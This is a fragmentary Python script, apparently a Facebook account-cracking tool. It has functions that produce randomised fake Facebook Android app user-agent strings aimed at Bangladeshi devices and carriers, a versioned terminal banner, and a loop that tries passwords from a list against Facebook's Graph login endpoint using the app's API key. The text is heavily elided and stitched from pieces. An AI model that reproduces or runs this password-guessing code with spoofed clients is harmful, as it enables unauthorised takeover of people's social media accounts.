...
def davik_user_agent():
    android_versions = ["8.1.0", "9.0.0", "10.0.2", "11", "12"]
    devices = [
        "Galaxy A6 (2018)", "Redmi Note 8 Pro", "Galaxy J7 Prime",
        "Infinix Hot 10", "Realme C25", "Oppo A5s", "Vivo Y20"
    ]
    fb_versions = ["340.0.0.21.116", "353.0.0.10.21", "360.0.0.15.120"]
    carriers = ["Robi", "Airtel", "Grameenphone", "Banglalink"]
    ...
    height = random.choice([1440, 1920, 2340])
    density = random.choice([1.5, 2.0, 2.5, 3.0])

    return (
        f"Davik/2.1.0 (Linux; U; Android {android}; {device} Build/TP1A.220624.014) "
        f"[FBAN/FB4A;FBAV/{fbav};FBBV/{random.randint(10000000,99999999)};"
        f"FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/en_US;FBCR/{carrier};FBMF/{device.split()[0]};"
        f"FBBD/{device.split()[0].lower()};FBDV/{device.replace(' ', '-')};"
        f"FBSV/{android};FBCA/arm64-v8a;]"
    )

# Example usage:
print(davik_user_agent())
#─━─━─━─━[User Agent]━─━─━─━─━#
# M2
def yousuffile():
...
def generate_dalvik_ua():
    ...
    devices = [
        ...
        ("Oppo", "A54", "RP1A.200720.012"),
        ("Vivo", "V21", "SP1A.210812.016"),
        ("OnePlus", "8 Pro", "QP1A.190711.020")
    ]
    
    fb_versions = ["341.0.0.12.117", "353.0.0.10.21", "340.0.0.21.116"]
    ...
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {device[1]} Build/{device[2]}) "
        f"[FBAN/FB4A;FBAV/{fb_version};FBBV/25063417;"
        f"FBDM/{{density=2.0,width=1080,height=2340}};FBLC/en_US;FBCR/Unknown;FBMF/{device[0]};]"
    )
    return ua
...
def bangladesh_davik_ua():
    android_versions = ["9", "10", "11", "12", "13"]
    devices = [
        ("Xiaomi", "Redmi Note 10 Pro", "QKQ1.200830.002"),
        ("Samsung", "Galaxy A51", "RP1A.200720.012"),
        ("Realme", "Realme 8i", "SP1A.210812.016"),
        ("Oppo", "F19 Pro", "TP1A.220624.014"),
        ("Vivo", "V20", "SP1A.210812.016"),
    ]
    fb_versions = ["345.0.0.20.117", "346.0.0.15.119", "347.0.0.12.118"]
    operators = ["Grameenphone", "Robi", "Banglalink", "Teletalk"]

    android = random.choice(android_versions)
    device_brand, device_model, build = random.choice(devices)
    fb_ver = random.choice(fb_versions)
    operator = random.choice(operators)

    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {android}; {device_model} Build/{build}) "
        f"[FBAN/FB4A;FBAV/{fb_ver};FBBV/{random.randint(10000000,99999999)};"
        f"FBDM/{{density=2.0,width=1080,height=2340}};"
        f"FBLC/en_GB;FBCR/{operator};FBMF/{device_brand};FBBD/{device_brand};FBPN/com.facebook.katana;"
        f"FBDV/{device_model};FBSV/{android};]"
    )
    return ua

# Example usage
for _ in range(3):
    print(bangladesh_davik_ua())
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 3.7
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':generate_dalvik_ua(),
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': bangladesh_davik_ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
